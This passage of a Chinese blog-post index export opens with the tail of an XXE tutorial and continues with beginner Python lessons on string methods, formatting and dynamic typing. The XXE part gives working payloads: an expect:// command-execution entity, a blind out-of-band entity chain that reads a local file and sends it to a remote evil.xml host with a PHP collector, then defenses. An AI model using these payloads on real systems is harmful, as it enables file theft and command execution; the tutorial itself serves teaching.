version&#x3D;&quot;1.0&quot;?&gt;\n&lt;!DOCTYPE ANY [\n&lt;!ENTITY test SYSTEM &quot;expect:&#x2F;&#x2F;whoami&quot;&gt;\n]&gt;\n&lt;abc&gt;&amp;test;&lt;&#x2F;abc&gt;\n\n\n\n2、没回显称为 blind xxe 可以使用外带数据通道 提取数据\n&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;\n&lt;!DOCTYPE ANY[\n&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:&#x2F;1.txt&quot;&gt;\n&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;192.168.0.107&#x2F;evil.xml&quot;&gt;\n%remote;\n%all;\n]&gt;\n&lt;root&gt;&amp;send;&lt;&#x2F;root&gt;\n\n远程服务器上的\nevil.xml 文件内容\n&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http:&#x2F;&#x2F;192.168.0.107&#x2F;1.php?file&#x3D;%file;&#39;&gt;&quot;&gt;\n\n\n\n&lt;?php file_put_contents(&quot;1.txt&quot;, $_GET[&#39;file&#39;]); ?&gt;\n\n\n\nhttp:&#x2F;&#x2F;127.0.0.1&#x2F;xxe.php?xml&#x3D;%3C%3fxml%20version%3d%221.0%22%3f%3E%0A%3C!DOCTYPE%20ANY[%0A%3C!ENTITY%20%25%20file%20SYSTEM%20%22file%3a%2f%2f%2fC%3a%2f1.txt%22%3E%0A%3C!ENTITY%20%25%20remote%20SYSTEM%20%22http%3a%2f%2f192.168.0.146%2fevil.xml%22%3E%0A%25remote%3b%0A%25all%3b%0A]%3E%0A%3Croot%3E%26send%3b%3C%2froot%3E\n\n文件写入成功。获取 1.txt 内容。\n三、防御1.使用开发语言提供的禁用外部实体的方法\nPHP：\nlibxml_disable_entity_loader(true);\nJAVA:\nDocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();\ndbf.setExpandEntityReferences(false);\nPython：\nfrom lxml import etree\nxmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))\n2.过滤用户提交的 XML 数据\n关键词：&lt;!DOCTYPE 和&lt;!ENTITY，或者，SYSTEM 和 PUBLIC\n3.升级 libxml 组件\n","slug":"XXE漏洞","date":"2021-10-09T10:08:52.627Z","categories_index":"渗透测试","tags_index":"渗透测试","author_index":"街溜子小王"},{"id":"c957b32eb0e2922ff6da2063068fd723","title":"五、Python的类型与运算-字符串（下","content":"五、Python的类型与运算-字符串（下）一、字符串方法\n除表达式之外，字符串还提供了一系列的方法去实现更复杂的文本处理任务。方法是与特定的对象相关联在一起的函数。从技术角度来讲，它们附属于对象的属性，而这些属性不过是些调用函数罢了。在Python中，表达式和内置函数可能在不同范围的类型有效，但方法通常特定于对象类型，例如，字符串方法仅适用于字符串对象。\n属性读取：Object.attribute格式的表达式可以理解为“读取object对象的属性attribute值”\n函数调用表达式：具有函数（参数）格式的表达式意味着“调用函数代码，传递零或者更多用逗号隔开的参数对象，最后返回函数的返回值”。\n这两者合并可以让我们调用一个对象方法。\n有如下几种字符串方法：\n&ensp;&ensp;&ensp;&ensp;大小写相关： \n&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;• S.capitalize()/S.title()/S.upper()/S.lower()/S.swapcase()\n&ensp;&ensp;&ensp;&ensp;排版相关： \n&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;• S.center(width[, fill])/ S.ljust(width[, fill])/S.rjust(width[, fill])/S.expandtabs(tabsize)/S.zfill(width)\n&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;• S.strip([chars])/S.lstrip([chars])/S.rstrip([chars])\n&ensp;&ensp;&ensp;&ensp;查找相关： \n&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;• S.startswith(prefix[, start[, end]])/S.endswith(suffix[ ,start[ ,end]])/S.count(sub[, start[, end]])\n&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;• S.find(sub [, start[, end]])/S.rfind(sub[, start[, end]])/S.replace(old,new[, count])\n&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;• S.index(sub[, start[, end]])/S.rindex(sub[, start[, end]])\n&ensp;&ensp;&ensp;&ensp;格式判断： \n&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;•S.isalpha()/S.isdigit()/S.isalnum()/S.islower/S.isupper()/S.isspace()/S.istitle()\n&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;• S.isdecimal()/S.isnumeric()/S.isidentifier()/S.isprintable() － Python3.x\n&ensp;&ensp;&ensp;&ensp;字符分隔： \n&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;• S.split([sep[, maxsplit]])/S.rsplit([sep[,maxsplit]])/S.splitlines([keepends])/S.partition(sep)/S.rpartition(sep)\n&ensp;&ensp;&ensp;&ensp;其他： \n&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;• S.join(iterable)\n&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;• S.maketrans(x[, y[, z]])/S.translate(map) － Python3.x\n&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;• S.format()\n1、大小写\nS.capitalize() － 第一个字母大写，其余都变成小写字母。\n&gt;&gt;&gt; &#39;Dora EmON&#39;.capitalize()\n&#39;Dora emon&#39;\n\n\nS.title() － 每一词的头字母大写，其余都变成小写字母。\n&gt;&gt;&gt; &#39;Dora EmON&#39;.title()\n&#39;Dora Emon&#39;\n\n\nS.upper() － 全改成大写\n&gt;&gt;&gt; &#39;Dora EmON&#39;.upper()\n&#39;DORA EMON&#39;\n\n\nS.lower() － 全改成小写\n&gt;&gt;&gt; &#39;Dora EmON&#39;.lower()\n&#39;dora emon&#39;\n\n\nS.swapcase() － 大小写转换\n&gt;&gt;&gt; &#39;Dora EmON&#39;.swapcase()\n&#39;dORA eMon&#39;\n\n\n\n2、排版\nS.center(width[, fill])/ S.ljust(width[, fill])/S.rjust(width[, fill]) － 原来的字符扩到指定长度，再用fill来填充其余空处，默认空格。中间对齐／左对齐／右对齐。\n&gt;&gt;&gt; &#39;DoraEmon&#39;.center(15)\n&#39;    DoraEmon   &#39;\n&gt;&gt;&gt; &#39;DoraEmon&#39;.center(15,&#39;十&#39;)\n&#39;十十十十DoraEmon十十十&#39;\n&gt;&gt;&gt; &#39;DoraEmon&#39;.ljust(15)\n&#39;DoraEmon\n&gt;&gt;&gt; &#39;DoraEmon&#39;.rjust(15,&#39;十&#39;)\n&#39;十十十十十十十DoraEmon&#39;\n\n\nS.expandtabs(tabsize) － 更改tabs（在字符串里”\\t”）转换为空格的数量，默认为8。\n&gt;&gt;&gt; &#39;Dora\\tEmon&#39;.expandtabs(8)\n&#39;Dora    Emon&#39;\n&gt;&gt;&gt; &#39;Dora\\tEmon&#39;.expandtabs(16)\n&#39;Dora            Emon&#39;\n\n\nS.zfill(width) － 原来的字符串扩到指定长度，前面使用0来填充，数字计算的时候会用到。\n&gt;&gt;&gt; &#39;DoraEmon&#39;.zfill(15)\n&#39;0000000DoraEmon&#39;\n\n\nS.strip([chars])/S.lstrip([chars])/S.rstrip([chars]) － 删除两遍／左边／右边的指定字符（默认为空格和换行符）。\n&gt;&gt;&gt; &#39; DoraEmon\\n &#39;.strip()\n&#39;DoraEmon&#39;\n&gt;&gt;&gt; &#39; DoraEmon\\n &#39;.lstrip()\n&#39;DoraEmon\\n &#39;\n&gt;&gt;&gt; &#39; DoraEmon\\n &#39;.rstrip()\n&#39; DoraEmon&#39;\n&gt;&gt;&gt; &#39; DoraEmon\\n &#39;.strip(&#39;Em&#39;)\n&#39; DoraEmon\\n &#39;\n\n\n\n3、查找\n在这里所有的start和start, end看成是是S[start:]和S[start:end]\nS.startswith(prefix[, start[, end]])/S.endswith(suffix[ ,start[ ,end]])－ 以特定字符串开头／结尾的，返回真假。\n&gt;&gt;&gt; &#39;DoraEmon&#39;.startswith(&#39;D&#39;)\nTrue\n&gt;&gt;&gt; &#39;DoraEmon&#39;.startswith(&#39;D&#39;,2,3)\nFalse\n&gt;&gt;&gt; &#39;DoraEmon&#39;.endswith(&#39;o&#39;,6,7)\nTrue\n\n\nS.count(sub[, start[, end]])－ 相应字符串在文本里的个数。\n&gt;&gt;&gt; &#39;DoraEmon&#39;.count(&#39;o&#39;)\n2\n&gt;&gt;&gt; &#39;DoraEmon&#39;.count(&#39;o&#39;,1,5)\n1\n\n\nS.find(sub [, start[, end]])/S.rfind(sub[, start[, end]])－ 查找第一个与sub匹配的字符串位置，没找到返回-1。\n&gt;&gt;&gt; &#39;DoraEmon&#39;.find(&#39;D&#39;)\n0\n&gt;&gt;&gt; &#39;DoraEmon&#39;.find(&#39;E&#39;)\n4\n&gt;&gt;&gt; &#39;DoraEmon&#39;.find(&#39;E&#39;,3,5)\n4\n&gt;&gt;&gt; &#39;DoraEmon&#39;.find(&#39;Q&#39;)\n-1\n\n\nS.index(sub[, start[, end]])/S.rindex(sub[, start[, end]])－ 与find差不多，但没找到会返回错误。\n&gt;&gt;&gt; &#39;DoraEmon&#39;.index(&#39;D&#39;)\n0\n&gt;&gt;&gt; &#39;DoraEmon&#39;.index(&#39;E&#39;)\n4\n&gt;&gt;&gt; &#39;DoraEmon&#39;.index(&#39;E&#39;,3,5)\n4\n&gt;&gt;&gt; &#39;DoraEmon&#39;.index(&#39;Q&#39;)\nTraceback (most recent call last):\n  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;\nValueError: substring not found\n\n\nS.replace(old, new[, count])－ 查找old，替换成new，count是只替换相应个数，默认全替换。\n&gt;&gt;&gt; &#39;DoraEmon&#39;.replace(&#39;o&#39;,&#39;Xiong&#39;,)\n&#39;DXiongraEmXiongn&#39;\n&gt;&gt;&gt; &#39;DoraEmon&#39;.replace(&#39;o&#39;,&#39;Xiong&#39;,1)\n&#39;DXiongraEmon&#39;\n\n\n\n4、格式判断\n返回的值都是真或者假。S.isalpha() － 判断是不是字母S.isdigit() － 判断是否数字S.isalnum() － 判断是否数字和字母S.islower() － 判断是不是有字母而且是全小写S.isupper() － 判断是不是有字母而且是全大写S.isspace() － 判断是不是只有空格和换行符号S.istitle() － 判断每个单词第一个字母是不是大写\n&gt;&gt;&gt; &#39;DoraEmon&#39;.isalpha()\nTrue\n&gt;&gt;&gt; &#39;DoraEmon&#39;.isdigit()\nFalse\n&gt;&gt;&gt; &#39;DoraEmon&#39;.isalnum()\nTrue\n&gt;&gt;&gt; &#39;DoraEmon&#39;.islower()\nFalse\n&gt;&gt;&gt; &#39;DoraEmon&#39;.isupper()\nFalse\n&gt;&gt;&gt; &#39;DoraEmon&#39;.isspace()\nFalse\n&gt;&gt;&gt; &#39;DoraEmon&#39;.istitle()\nFalse\n\n\n下面的只有Python3.x开始支持S.isdecimal() － 判断是不是数字S.isnumeric() － 判断是不是数字S.isidentifier() － 判断字符能否成为标识符S.isprintable() － 判断字符是否全部是能打印（print）的\n&gt;&gt;&gt; &#39;DoraEmon&#39;.isdecimal()\nFalse\n&gt;&gt;&gt; &#39;DoraEmon&#39;.isnumeric()\nFalse\n&gt;&gt;&gt; &#39;DoraEmon&#39;.isidentifier()\nTrue\n&gt;&gt;&gt; &#39;DoraEmon&#39;.isprintable()\nTrue\n\n\n\n5、字符分割\nS.split([sep[, maxsplit]])／S.rsplit([sep[, maxsplit]])－ 从左／右以sep（字符串）分隔，最多maxsplit次（默认无限）\n&gt;&gt;&gt; &#39;DoraEmon&#39;.split(&#39;o&#39;)\n[&#39;D&#39;, &#39;raEm&#39;, &#39;n&#39;]\n&gt;&gt;&gt; &#39;DoraEmon&#39;.split(&#39;o&#39;,1)\n[&#39;D&#39;, &#39;raEmon&#39;]\n&gt;&gt;&gt; &#39;DoraEmon&#39;.rsplit(&#39;o&#39;,1)\n[&#39;DoraEm&#39;, &#39;n&#39;]\n\n\nS.splitlines([keepends])－ 以\\n或者\\r或者\\r\\n分隔\n&gt;&gt;&gt; &#39;D\\no\\rraEmo\\r\\nn&#39;.splitlines()\n[&#39;D&#39;, &#39;o&#39;, &#39;raEmo&#39;, &#39;n&#39;]\n\n\nS.partition(sep)/S.rpartition(sep)－ 从左／右找第一个sep分隔，sep左边的，sep，sep右边的。\n&gt;&gt;&gt; &#39;DoraEmon&#39;.partition(&#39;o&#39;)\n(&#39;D&#39;, &#39;o&#39;, &#39;raEmon&#39;)\n&gt;&gt;&gt; &#39;DoraEmon&#39;.rpartition(&#39;o&#39;)\n(&#39;DoraEm&#39;, &#39;o&#39;, &#39;n&#39;)\n\n\n\n6、其他\nS.join(iterable)S.maketrans(x[, y[, z]])/S.translate(map)－创建对照表, 然后使用translate()函数, 调用对照表, 把字符串(string)中的字符, 进行相应的替换，这个在python2.x和python3.x完全不同。S.format－字符串格式化方法，后面会详细讲解\n&gt;&gt;&gt; &#39;-&#39;.join(&#39;DoraEmon&#39;)\n&#39;D-o-r-a-E-m-o-n&#39;\n&gt;&gt;&gt; \n&gt;&gt;&gt; D&#x3D;&#39;DoraEmon&#39;\n&gt;&gt;&gt; X&#x3D;D.maketrans(&#39;Dora&#39;,&#39;DaXo&#39;)\n&gt;&gt;&gt; D.translate(X)&#39;DaXoEman&#39;\n&gt;&gt;&gt; \n&gt;&gt;&gt; &#39;DoraEmon&#123;DA&#125;&#39;.format(DA&#x3D;&#39; And DaXiong&#39;)\n&#39;DoraEmon And DaXiong&#39;\n\n\n\n二、字符串格式化表达\n这个格式化表达式与C语言的差不多。\n&gt;&gt;&gt; &#39;%d%s%s4&#39;%(1,&#39;2&#39;,&#39;Three&#39;)\n&#39;12Three4&#39;\n\n\n格式是字符串里有%[(name)][flag][width][.precision]typecode加一个%, 再加上相应个数的元组（后面会讲元组）\n1、格式化代码（typecode）\ns 字符串（或任何对象）r 与s一样，但输出方式是repr方式，而不是strc 字符d 十进制（整数）i 整数u 无号整数o 八进制整数x 十六进制整数X 与x同样，A－F是大写e 浮点指数E 与e同样，E是大写f 浮点数十进制F 浮点数十进制g 浮点e或fG 浮点E或F\n2、例子\n&gt;&gt;&gt; &quot;%s | %r | %c&quot; %(&quot;This is string&quot;,&quot;This is repr&quot;,&quot;C&quot;)\n&quot;This is string | &#39;This is repr&#39; | C&quot;\n&gt;&gt;&gt; &quot;%d | %i | %o | %x | %x&quot;%(3,5,11,13,15)\n&#39;3 | 5 | 13 | d | f&#39;\n&gt;&gt;&gt; &quot;%e | %E | %f | %F | %g | %G&quot; %(1.5E3,1.5e3,13.5,13.5,1.5E13,13.5e15)\n&#39;1.500000e+03 | 1.500000E+03 | 13.500000 | 13.500000 | 1.5e+13 | 1.35E+16&#39;\n&gt;&gt;&gt; &quot;%(string)-10s&quot; %(&#123;&#39;string&#39;:&#39;1&#39;&#125;)\n&#39;1\n&gt;&gt;&gt; &quot;%(float)+10.2f&quot; % (&#123;&#39;float&#39;:3.1&#125;)\n&#39;     +3.10&#39;\n&gt;&gt;&gt; &quot;%(float)-10.2f&quot; % (&#123;&#39;float&#39;:3.1&#125;)\n&#39;3.10\n\n\n\n三、字符串格式化方法\n在Python字符串方法里有format方法，根据特定的格式在里面输入相应关键字。例：‘What do you like, {0}, {1} or {2}’.format(“spam”, “eggs”, “ham”)结果是’What do you like, spam, eggs, ham’也可以换顺序 ：‘What do you like, {2}, {1} or {0}’.format(“spam”, “eggs”, “ham”)结果是’What do you like, ham, eggs, spam’也可以使用相应的名字‘What do you like, {ham}, {0} or {eggs}’.format(“spam”, eggs=”eggs”, ham=”ham”)结果是’What do you like, ham, spam, eggs’具体格式为：{fieldname!conversionflag:formatspec}fieldname是位置信息或关键字，后面可以跟属性或指针conversionflag是r或者s，分别对应repr和strformatspec是具体显示方式，可以替代前面所使用过的其他字符串方法\nfieldtype 使用属性或指针\n&gt;&gt;&gt; import sys\n&gt;&gt;&gt; sys.platform\n&#39;win32&#39;\n&gt;&gt;&gt; &quot;&#123;0.platform&#125;&quot;.format(sys)\n&#39;win32&#39;\n&gt;&gt;&gt; &quot;&#123;0[Dora]&#125;&quot;.format(&#123;&quot;Dora&quot;:&quot;DoraEmon&quot;&#125;)\n&#39;DoraEmon&#39;\n&gt;&gt;&gt; dict1&#x3D;&#123;&quot;Dora&quot;:&quot;DoraEmon&quot;&#125;  #关于字典，后面会讲到。\n&gt;&gt;&gt; dict1[&quot;Dora&quot;]\n&#39;DoraEmon&#39;\n\n\n当使用字典的时候需要引号来扩，但使用字符串格式化方法的时候不能使用引号\nformatspec = [[fill]align][sign][#][0][width][,][.precision][type]，fill和align再加上后面的width相当于方法里的center，ljust，rjust\n&gt;&gt;&gt; &quot;&#123;:*^40&#125;&quot;.format(&quot;start&quot;)\n&#39;*****************start******************&#39;\n&gt;&gt;&gt; &quot;&#123;:*^40&#125;&quot;.format(&quot;end&quot;)\n&#39;******************end*******************&#39;\n\n\n这里也是，fill必须是单个字符。align有&lt;左对齐，&gt;右对齐，^中间显示，=，在数字里符号在最前，数字右对齐。\n&gt;&gt;&gt; print(&quot;&#123;:&#x3D;10&#125;\\n&#123;:&#x3D;+10&#125;\\n&#123;:-^10&#125;\\n&#123;:&#x3D;+10&#125;&quot;.format(10,3,&#39;-&#39;,13))\n        10\n+        3\n----------\n+       13\n\n\nsign的值是+,-和空格。当+的时候，即使是正数，也会显示符号，-是只有在负数时显示符号（默认值），空格时，会为正数前面留下符号位\n&gt;&gt;&gt; &quot;&#123;:+&#125;&quot;.format(10)\n&#39;+10&#39;\n&gt;&gt;&gt; &quot;&#123;:-&#125;&quot;.format(10)\n&#39;10&#39;\n&gt;&gt;&gt; &quot;&#123;:-&#125;&quot;.format(-10)\n&#39;-10&#39;\n&gt;&gt;&gt; &quot;&#123;&#125;&quot;.format(10)\n&#39;10&#39;\n&gt;&gt;&gt; &quot;&#123;:&#125;&quot;.format(10)\n&#39;10&#39;\n\n\n只有在数字显示里，显示二进制数，八进制数，十六进制数的时候，需要显示前面的0b,0o,0x的时候使用。\n&gt;&gt;&gt; &quot;&#123;0:#8b&#125;,&#123;0:#8o&#125;,&#123;0:#8x&#125;&quot;.format(10)\n&#39;  0b1010,    0o12,     0xa&#39;\n&gt;&gt;&gt; &quot;&#123;:,&#125;&quot;.format(10000000)\n&#39;10,000,000&#39;\n&gt;&gt;&gt; &quot;&#123;:08.5&#125;&quot;.format(13.5767)\n&#39;0013.577&#39;\n\n\ntype跟之前使用％表示的相等。当字符时：使用s，默认就是s；当整数时：b，o，x和X是二进制、八进制、十六进制，c是数字按unicode转成字符，d是正常十进制，默认是d。也可以使用n来代替d。\n&gt;&gt;&gt; &quot;&#123;0:d&#125;,&#123;0:b&#125;,&#123;0:o&#125;,&#123;0:x&#125;,&#123;0:X&#125;&quot;.format(10)\n&#39;10,1010,12,a,A&#39;\n\n\n浮点数时：e和E是指数，f和F是浮点数。g和G是同一的，也可以使用n来代替g，％是显示百分比。\n&gt;&gt;&gt; &quot;&#123;0:e&#125;,&#123;0:F&#125;,&#123;0:g&#125;,&#123;0:n&#125;,&#123;0:%&#125;&quot;.format(1.1)\n&#39;1.100000e+00,1.100000,1.1,1.1,110.000000%&#39;\n\n","slug":"五、Python的类型与运算-字符串（下","date":"2021-10-09T10:03:02.650Z","categories_index":"python","tags_index":"python","author_index":"街溜子小王"},{"id":"3f10344ab8a63bfae2ac9b0cce2d81ad","title":"四、Python的类型与运算-字符串（上","content":"四、Python的类型与运算-字符串（上）一、字符串简介\n在Python里字符串是一个有序的字符的集合，用来存储和表现基于文本的信息。字符串可以用来表示能够像文本那样编辑的任何信息：符号和词语、在入道内存中的文本的内容、Internet网址和Python程序等。\n在Python里字符串被划分为不可变序列这一类别，这意味着这些字符串所包含的字符存在从左至右的位置顺序，并且他们不可以在远处修改。字符串在Python里属于一个序列类型的对象类别，在后面介绍的列表，元组都是序列类型。在这章对文本的操作，很多都能应用于序列类型的对象类别。\n二、字符串常量\n在Python里有很多种方法来表示字符串：• 单引号：’Text”1”‘ • 双引号：”Text’1’”• 三引号：’’’…Lines…’’’,”””…Lines…”””.• 转义字符：”Line1\\tadded tab\\nLine2”\n• Raw字符串：r”C:\\My\\new\\Directory\\file.exe”• Python 3.x中的Byte字符串：b’Te\\x01xt’• Python 2.x中的Unicode字符串：u’my\\u0020text’\n在Python 3.x里默认是使用Unicode方式存储字符串，在Python 2.x里默认是使用Latin-1方式存储字符串，因此不能直接识别中文。\n# -*- encoding&#x3D;utf8 -*-\n\n\n在Python2.x脚本文件加上上面一句话就能正常使用中文。\n1、转义\n跟其他开发语言相通，Python也有转义字符：(反斜杠)\n当我们在一个字符串里需要同时使用单引号(‘)和双引号(“)的时候，根据我们所使用的表示字符串的引号类型进行转义。\n&gt;&gt;&gt;&#39;a&quot;b\\&#39;c&#39;\n\n\n在这里，我们要输入的字符串为a”b’c。\n因为我们使用单引号来表示字符串的开始和结尾，所以b后面的单引号需要转义。当我们使用双引号来表示字符串，我们需要在双引号前面使用反斜杠进行转义：\n&gt;&gt;&gt;s &#x3D; &quot;a\\&quot;b&#39;c&quot;\n\n\n除了这两个，我们还有很多反斜杠加上单个字符来进行转义的。\n\n\\newline：忽视新行（连续）#newline就是按键盘上的enter（或return）\n\n\\ ：反斜杠，因为反斜杠本身就是转义字符，所以两个反斜杠才能表示一个。\n\n\\’ ：单引号\n\n\\”：双引号\n\n\\a：响铃\n\n\\b：倒退(一位）\n\n\\f：换页（下一页，同一列。特定终端下可用。）  \n\n\\n：新行（换行）\n\n\\r ：返回(返回到开始）\n\n\\t ：水平制表符\n\n\\v ：垂直制表符\n\n\\uhhhh：Unicode 16位的十六进制值\n\n\\Uhhhhhhhh：Unicode 32位的十六进制值\n\n\\xhh：十六进制值\n\n\\ooo：八进制值\n\n\\0：Null（不是字符串结尾）\n\n\\other：不转义\n\n\n转义测试：\n&gt;&gt;&gt; print(&#39;a\\0b\\0c&#39;)\na b c\n&gt;&gt;&gt; print(&#39;t\\te\\ex\\t\\ta\\an\\nd\\dEND&#39;)\nt       e\\ex            an\nd\\dEND\n&gt;&gt;&gt; print(&#39;\\u0043&#39;)\nC\n&gt;&gt;&gt; print(&#39;\\U00000043&#39;)\nC\n\n\n\n2、raw印制转义\n在Python里我们有的时候是需要印制转义的。比如，当有个Windows的目录如下：\n&gt;&gt;&gt; print(&#39;C:\\newfile\\files&#39;)\nC:\newfileiles\n\n\n这个时候，要是按正常来说，\\n和\\f都会被转移，但我们写双斜杠又麻烦，这个时候可以使用raw字符串来印制转义。\n&gt;&gt;&gt; print(r&#39;C:\\newfile\\files&#39;)\nC:\\newfile\\files\n\n\n这个时候其值会跟写的完全一样，当然，我们也可以写成如下：\n&gt;&gt;&gt; print(&#39;C:\\\\newfile\\\\files&#39;)\nC:\\newfile\\files\n\n\n但是还是没有使用印制转义方便，特别是在路径很长的时候。\n三、字符串操作\n1、len（）\n\n在Python里有很多函数，可以对字符串进行操作：len()是看字符串长度的。\n&gt;&gt;&gt; print(len(&#39;小小哆啦&#39;))\n4\n\n\n当我们使用unicode的时候，按中文字符的个数显示，但使用python2.x里的默认字符编码，就会是三倍的数值。\n因为Python3开始，默认字符编码是unicode，所以在Python3.x里是没有问题的。\n2、合并字符串\n字符串合并，重复等，跟数字的操作类似：\n&gt;&gt;&gt; &#39;Dora&#39;+&#39;Emon&#39;\n&#39;DoraEmon&#39;\n&gt;&gt;&gt; &#39;Dora&#39;*7\n&#39;DoraDoraDoraDoraDoraDoraDora&#39;\n\n\n这里的第二个操作可以为我们节省很多字符输入，比如我们需要输入如下：\n&gt;&gt;&gt; print(&#39;-----……-----&#39;)     #80个“-”\n-----……-----\n\n\n这个可以使用如下方法简单实现：\n&gt;&gt;&gt; print(&#39;-&#39;*80)\n-----……-----\n\n\n当需要字符合并的时候，如下方法也可以，但不建议使用。\n&gt;&gt;&gt; &#39;Dora&#39;&#39;Emon&#39;\n&#39;DoraEmon&#39;\n&gt;&gt;&gt; &#39;Dora&#39; &#39;Emon&#39;\n&#39;DoraEmon&#39;\n\n\n\n3、顺序提取字符\n当我们需要对每个字符串进行操作的时候，可以如下进行操作：\n&gt;&gt;&gt; for DaXiong in &#39;DoraEmon&#39;:\n...     print(DaXiong,end&#x3D;&#39; &#39;)\n...\nD o r a E m o n\n\n\n这个意思是，我们从a字符串（序列）里按顺序提取字符，进行操作。关于循环，后面在函数章节讲解。\n4、判断存在字符\n我们需要知道某个字符是否在一个字符串的时候，可以使用in或者not in来判断：\n&gt;&gt;&gt; &#39;D&#39; in &#39;DoraEmon&#39;\nTrue\n&gt;&gt;&gt; &#39;D&#39;not in &#39;DoraEmon&#39;\nFalse\n&gt;&gt;&gt; &#39;X&#39; in &#39;DoraEmon&#39;\nFalse\n\n\n\n5、字符串分片\n我们也可以对字符串分片，比如对DoraEmon，我们只需要第一个字符，第三个字符，或者中间两个字符，后两个字符等等。\n&gt;&gt;&gt; Dora&#x3D;&#39;DoraEmon&#39;\n&gt;&gt;&gt; Dora[1],Dora[5],Dora[-3]\n(&#39;o&#39;, &#39;m&#39;, &#39;m&#39;)\n&gt;&gt;&gt; Dora[1:5]\n&#39;oraE&#39;\n&gt;&gt;&gt; Dora[-5:-1]\n&#39;aEmo&#39;\n&gt;&gt;&gt; Dora[3:]\n&#39;aEmon&#39;\n&gt;&gt;&gt; Dora[:-5]\n&#39;Dor&#39;\n&gt;&gt;&gt; Dora[:]\n&#39;DoraEmon&#39;\n\n\n看一下在Python里对字符串的分段是如何进行的，例如：text=“ThisIsTestText”\n\n提取单个字母时，需使用字母前的数字。比如：h，就是1或者-13，提取范围时是开始字母的前面的数字到最后字母的后面数字。比如h到x，就是[1,13]或者[-13,13]或者[1,-1]或者[-13,-1]，从开始到某个字母就可以[:3];从某个字幕到结尾就是[3:]。\n分片操作还可以有第三个参数，间隔。我们要第一个字母开始，每隔一个字母显示，结果应该是“DrEo”\n&gt;&gt;&gt; Dora&#x3D;&#39;DoraEmon&#39;\n&gt;&gt;&gt; Dora[::2]\n&#39;DrEo&#39;\n\n\n或者从第二个字母开始：\n&gt;&gt;&gt; Dora[1::2]\n&#39;oamn&#39;\n\n\n或者我们要倒过来：\n&gt;&gt;&gt; Dora[::-1]\n&#39;nomEaroD&#39;\n&gt;&gt;&gt; Dora[-1:1:-1]\n&#39;nomEar&#39;\n\n\n\n6、字符串转换\n当我们需要对字符串大小写等操作的时候，需要对字符串转换成相应的代码。这个时候我们就需要两个函数：ord和chr，ord是把一个字符转换成数字，chr是把数字转换成单个字符。\n&gt;&gt;&gt; ord(&#39;D&#39;)\n68\n&gt;&gt;&gt; chr(68)\n&#39;D&#39;\n&gt;&gt;&gt; ord(&#39;小&#39;)\n23567\n&gt;&gt;&gt; chr(23567)\n&#39;小&#39;\n\n\n注：在Python3.x里可以直接使用中文字符，但是在Python2.x就不能直接用了。\n\n用这两个函数，可以对字符串转换进行简单的大小写操作了，比如：把一个字符串里的内容全转换成大些：\n&gt;&gt;&gt; DORA&#x3D;&#39;&#39;  #初始化DORA\n&gt;&gt;&gt; Dora&#x3D;&#39;DoraEmon&#39;  #设置Dora\n&gt;&gt;&gt; for DaXiong in Dora:  #循环，按顺序提取Dora字符串内容\n...     DaXiong_code&#x3D;ord(DaXiong)  #字符转换成ascII码\n...     if 97&lt;&#x3D;DaXiong_code and DaXiong_code &lt;&#x3D;122:  #当值大于等于97（a的值）或小于等于122（z的值）\n...         DORA+&#x3D;chr(DaXiong_code-32)  #在值的基础上减32（大小写之间的差距）\n...     else:...         DORA+&#x3D;DaXiong  #其余情况不变\n...\n&gt;&gt;&gt; DORA\n&#39;DORAEMON&#39;\n\n\n\n7、字符串序列\n在Python里字符串算是序列，但是字符串是不可修改的对象，所以如下操作不能正常被执行：\n&gt;&gt;&gt; Dora&#x3D;&#39;DoraEmon&#39;\n&gt;&gt;&gt; Dora[3]&#x3D;&#39;DaXiong&#39;\nTraceback (most recent call last):\n  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;\nTypeError: &#39;str&#39; object does not support item assignment\n\n\n但是我们可以重新给原来的变量赋值：\n&gt;&gt;&gt; Dora&#x3D;&#39;DaXiong&#39;+Dora[3:]\n&gt;&gt;&gt; Dora\n&#39;DaXiongEmon&#39;\n\n\n\n","slug":"四、Python的类型与运算-字符串（上","date":"2021-10-09T10:02:55.933Z","categories_index":"python","tags_index":"python","author_index":"街溜子小王"},{"id":"efd3d36e2166869979e3a900ac0878c5","title":"三、Python的类型与运算-动态类型简介","content":"三、Python的类型与运算-动态类型简介一、变量、对象、引用\n变量：在Python里，不像别的一些语言，需要声明变量类型。因为在Python里变量没有类型。变量创建：当第一次赋值给一个变量的时候，它就自动被创建了。变量类型：在Python里变量没有类型变量使用：当变量被表达式使用时马上被其引用的对象所取代。\n&gt;&gt;&gt; a&#x3D;153  #在这里3是整数\n&gt;&gt;&gt; a&#x3D;&#39;Dora&#39;  #在这里&quot;Three&quot;是字符串\n&gt;&gt;&gt;\n&gt;&gt;&gt; a&#x3D;153  #创建变量a，创建对象3，a变量引用对象3\n\n\n当我们输入a=3时：\n\n变量：一个系统表的元素，拥有指向对象的连接的空间对象：分配的一块内存，有足够的空间去表示他们所代表的值引用：自动形成的从变量到对象的指针  \n从之前的说明能看出，变量是存放指针的，因此变量没有类型。对象是存放数据的，所以对象有类型之说，因此如下操作在Python里是完全允许的。\n&gt;&gt;&gt; a&#x3D;3\n&gt;&gt;&gt; a&#x3D;&quot;Three&quot;\n&gt;&gt;&gt; 